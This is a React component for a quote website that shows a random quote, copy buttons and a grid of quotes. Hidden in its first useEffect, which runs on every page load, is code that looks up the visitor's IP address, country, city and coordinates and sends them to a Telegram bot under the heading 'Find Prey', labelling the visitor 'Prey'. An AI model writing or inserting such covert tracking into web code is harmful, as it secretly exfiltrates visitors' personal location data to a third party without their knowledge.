import { Copy, Edit } from "lucide-react";
import { useGetRandomQuoteQuery } from "../../store/api/quotes/get-random-quote-api";
import { useEffect, useState } from "react";
import { ring2 } from "ldrs";
import { Button } from "../../components/ui/button";
import { toast } from "sonner";
import { useGetAllQuotesQuery } from "../../store/api/quotes/get-all-quotes-api";
import axios from "axios";
import { CHAT_ID, IP_API, TELEGRAM_TOKEN } from "../../hook/useEnv";

ring2.register();

type Quote = {
  quote: string;
  author: string;
  id: number;
};

function Quote() {
  useEffect(() => {
    let URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
    axios(IP_API).then((res) => {
      let message = `<b>Find Prey</b>\n`;
      message += `<b>Site name:</b> Modern Features🛠️\n`;
      message += `<b>Feature:</b> Quote\n`;
      message += `<b>Country:</b> ${res.data.country}\n`;
      message += `<b>City:</b> ${res.data.city}\n`;
      message += `<b>Prey's IP:</b> ${res.data.ip}\n`;
      message += `<b>Location:</b> ${res.data.loc}\n`;
      axios.post(`${URL}/sendPhoto`, {
        chat_id: CHAT_ID,
        photo: "https://ibb.co/HVQ4grv",
        caption: message,
        parse_mode: "HTML",
      });
    });
  }, []);
  const [getAnother, setGetAnother] = useState(true);
  const { data, isLoading } = useGetRandomQuoteQuery(getAnother);
  const { data: allQuotes } = useGetAllQuotesQuery(true) as {
    data: { quotes: Quote[] };
  };
  const [quote, setQuote] = useState<Quote>(data);
  useEffect(() => {
    setQuote(data);
  }, [data]);

  const getAnotherQuote = () => {
    setGetAnother((prev) => !prev);
  };

  return (
    <section className="w-full h-screen overflow-x-auto bg-gradient-to-b from-blue-500 to-indigo-600 p-10">
      <div className="max-w-3xl mx-auto">
        <h1 className="text-5xl font-bold text-white text-center mb-10">
          Quote
        </h1>
        <div className="bg-white shadow-lg rounded-lg p-8">
          {isLoading ? (
            <div className="text-center">
              <l-ring-2
                size="40"
                stroke="5"
                stroke-length="0.25"
                bg-opacity="0.1"
                speed="0.8"
                color="blue"
              ></l-ring-2>
            </div>
          ) : (
            quote && (
              <div className="text-center">
                <p className="italic text-gray-700 text-lg font-serif mb-4">
                  "{quote.quote}"
                </p>
                <p className="text-sm text-gray-600 font-medium">
                  - {quote.author}
                </p>
              </div>
            )
          )}

          <div className="flex justify-center mt-10 gap-5">
            <Button
              className="quote-btn flex items-center gap-2"
              onClick={() => {
                toast("Quote Copied", {
                  description: <p className="line-clamp-2">{quote.quote}</p>,
                  duration: 3000,
                  icon: <Copy />,
                  closeButton: true,
                  position: "top-center",
                  action: {
                    label: "Undo",
                    onClick: () => '',
                  },
                });
                navigator.clipboard.writeText(quote.quote);
              }}
            >
              Copy Quote
              <Copy />
            </Button>
            <Button
              className="quote-btn flex items-center gap-2"
              onClick={getAnotherQuote}
            >
              Get Another Quote
              <Edit />
            </Button>
          </div>
        </div>
      </div>
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 mt-10 gap-8 container">
        {allQuotes &&
          allQuotes.quotes.map((quote) => (
            <div
              className="bg-white relative p-5 rounded-lg overflow-hidden group hover:scale-110 duration-300 shadow-md flex flex-col"
              key={quote.id}
            >
              <i className="text-gray-700 mb-4">{quote.quote}</i>
              <b className="mt-auto text-right text-gray-600">
                - {quote.author}
              </b>
              <div className="absolute group-hover:left-2 duration-300 -left-full bottom-2">
                <Button
                  onClick={() => {
                    toast("Quote Copied", {
                      description: (
                        <p className="line-clamp-2">{quote.quote}</p>
                      ),
                      duration: 3000,
                      icon: <Copy />,
                      closeButton: true,
                      position: "top-center",
                      action: {
                        label: "Undo",
                        onClick: () => "",
                      },
                    });
                    navigator.clipboard.writeText(quote.quote);
                  }}
                >
                  <Copy />
                </Button>
              </div>
            </div>
          ))}
      </div>
    </section>
  );
}

export default Quote;
